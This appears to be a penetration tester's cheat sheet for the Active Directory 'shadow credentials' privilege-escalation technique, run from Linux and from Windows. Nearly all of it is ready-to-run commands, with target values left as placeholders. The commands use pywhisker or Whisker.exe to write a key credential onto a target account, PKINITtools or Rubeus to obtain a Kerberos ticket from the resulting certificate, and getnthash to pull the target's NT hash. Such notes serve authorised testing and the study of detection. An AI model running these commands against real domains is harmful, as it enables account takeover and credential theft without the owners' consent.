---
title: "AddKeyCredentialLink"
date: 2024-7-31
tags: ["AddKeyCredentialLink", "active driectory", "ad", "Windows", "shadow credentials", "whisker", "pywhisker"]
---

---
### Privesc #1: Shadow credentials (From Linux)

[pywhisker](https://github.com/ShutdownRepo/pywhisker)

#### 0. Pre-check \[optional\]

```bash
python3 pywhisker.py --action list -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> --dc-ip <DC> -t <TARGET_USER> --use-ldaps
```

#### 1. Add shadow credentials

```bash
python3 pywhisker.py --action add -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> --dc-ip <DC> -t <TARGET_USER> --use-ldaps
```

<br>

```bash
# Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type'
pip3 install -I pyopenssl==24.0.0
```

#### 2. Request TGT using PFX file

[PKINITtools](https://github.com/dirkjanm/PKINITtools)

```bash
sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASSWORD> <DOMAIN>/<USERNAME> <USERNAME>.ccache -dc-ip <DC>
```

#### 3. Import ticket

```bash
export KRB5CCNAME=<USERNAME>.ccache
```

#### 4. Get NT hash

```bash
python3 getnthash.py <DOMAIN>/<USERNAME> -key <AS-REP_encryption_key>
```

### Privesc #1: Shadow credentials (From Windows)

[Whisker.exe](https://github.com/eladshamir/Whisker)

#### 0. Pre-check \[optional\]

```powershell
.\Whisker.exe list /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC>
```

#### 1. Add shadow credentials

```powershell
.\Whisker.exe add /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC> /password:<PASSWORD>
```

#### 2. Request TGT using PFX file and get NT hash

```powershell
.\rubeus.exe asktgt /user:<TARGET_USER> /certificate:<BASE64_CERT> /password:<PASSWORD> /domain:<DOMAIN> /dc:<DC> /getcredentials /show
```

<br>
